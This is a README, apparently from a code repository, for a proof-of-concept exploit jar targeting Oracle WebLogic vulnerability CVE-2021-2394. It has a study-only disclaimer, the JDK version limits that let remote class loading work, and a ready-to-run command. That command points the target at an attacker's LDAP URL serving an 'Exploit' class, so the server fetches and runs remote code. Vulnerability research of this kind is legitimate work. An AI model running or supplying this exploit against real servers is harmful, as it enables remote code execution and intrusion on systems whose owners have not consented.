# CVE-2021-2394

POC of CVE-2021-2394

- 免责声明
  - 项目仅供学习使用，任何未授权检测造成的直接或者间接的后果及损失，均由使用者本人负责

* 注意事项
  * POC使用IIOP发包，请添加相关依赖（已将12.2.1.3.0版本的依赖放release）
  * 请使用低版本的jdk安装weblogic进行测试
    > 基于RMI的利用方式，JDK版本限制于6u132、7u131、8u121之前，在8u122及之后的版本中，加入了反序列化白名单的机制，关闭了RMI远程加载代码
    > 基于LDAP的利用方式，JDK版本限制于6u211、7u201、8u191、11.0.1之前，在8u191版本中，Oracle对LDAP向量设置限制，发布了CVE-2018-3149，关闭JNDI远程类加载
    > From：https://www.freebuf.com/vuls/279465.html
  * 在虚拟机环境中无法复现可参考https://xz.aliyun.com/t/7498
    

* 使用方法：
  * 启动一个ldap服务
  * `java -jar CVE_2021_2394.jar rhost rport ldapurl`
  * eg:`java -jar CVE_2021_2394.jar 192.168.137.1 7001 ldap://192.168.137.1:8087/Exploit`
* 参考链接：
  * https://mp.weixin.qq.com/s/onoMpyenDkMmsoGEw8VO2A
  * https://github.com/Y4er/CVE-2020-14756
  * https://github.com/Y4er/CVE-2020-2551
* 更新
  * 2021/8/15 删除一些不必要的代码
* 分析文章
  * https://mp.weixin.qq.com/s/AxJJxbkclr4ijXX8lpNAfw 
